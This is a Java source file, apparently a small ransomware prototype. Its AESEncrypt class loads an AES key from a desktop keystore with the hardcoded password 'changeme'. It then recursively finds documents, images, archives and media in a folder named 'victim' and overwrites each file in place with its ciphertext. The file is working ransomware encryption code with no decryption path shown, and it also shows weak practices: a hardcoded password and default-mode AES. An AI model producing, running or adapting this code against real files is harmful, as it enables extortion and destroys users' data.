import javax.crypto.Cipher;
import java.security.*;
import java.security.cert.CertificateException;
import java.io.IOException;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.File;
import java.util.Collection;
import org.apache.commons.io.FileUtils;

import java.util.Date;
import javax.crypto.SecretKey;
import org.apache.commons.io.FilenameUtils;


/**
 * Created by NetBeans IDE 8.1
 * Author: sheldonhuang
 * Date: Feb 26, 2016.
 */
public class AESEncrypt {
    static KeyStore ks;
    static KeyStore.PasswordProtection password;
    static String alias = AESGenKey.alias;
    static String userDesktop = WindowsUtils.getCurrentUserDesktopPath();
    

    
  
    /*Method:getkey(String alias)
    Get key from keystore with the given alias
    */
    public static Key getkey(String alias) throws NoSuchAlgorithmException, UnrecoverableKeyException, KeyStoreException {

        Key k = ks.getKey(alias, "changeme".toCharArray());

        return k;
    }

    public static void start(String[] args) throws Exception {

        AESEncrypt aesEnc = new AESEncrypt();
        
        password = new KeyStore.PasswordProtection("changeme".toCharArray());
        //Initialise KeyStore
         FileInputStream fis = new FileInputStream(userDesktop+"\\keystorefile.jce");
         ks = KeyStore.getInstance("JCEKS");
         ks.load(fis, "changeme".toCharArray());
         fis.close();
         
         
        //Get Key
         
        Key mykey = AESEncrypt.getkey(alias);
       

        // Create a cipher object and use the generated key to initialize it
        Cipher cipher = Cipher.getInstance("AES");
        cipher.init(Cipher.ENCRYPT_MODE, mykey);

         File dir = new File(userDesktop+"\\victim");
            String [] str = {"txt","TXT","RAR","rar","ZIP","zip","java","JAVA","mp4","MP4","webm","mp3","pdf","docx","doc","xlsx","xls","html","xlm","pptx","PNG","jpg"};
            //if(dir.isDirectory()) {
                 Collection<File> files = FileUtils.listFiles(dir,str,true);
                  for(File f:files){
                       //String fileNameWithOutExt = FilenameUtils.removeExtension(f.getName());                       
                    //Read input file into byte array
                    File clr = f;
                    if (!clr.exists()) {
                        System.out.println("Files not found");
                        return;
                    }
                    FileInputStream fi = new FileInputStream(clr);
                    long length = clr.length();
                    byte[] plaintext = new byte[(int) length];
                    fi.read(plaintext);
                    fi.close();

                    // Encrypt the text and write into output file
                            //Do the Encryption
                    byte[] ciphertext = cipher.doFinal(plaintext);
                    
                    String encname = f.getParent()+"/"+f.getName();
                    FileOutputStream fo = new FileOutputStream(new File(encname));
                    fo.write(ciphertext);
                    fo.close();
                 }
                  System.out.println("AESEncrypt Done");
           // }   

    }


}
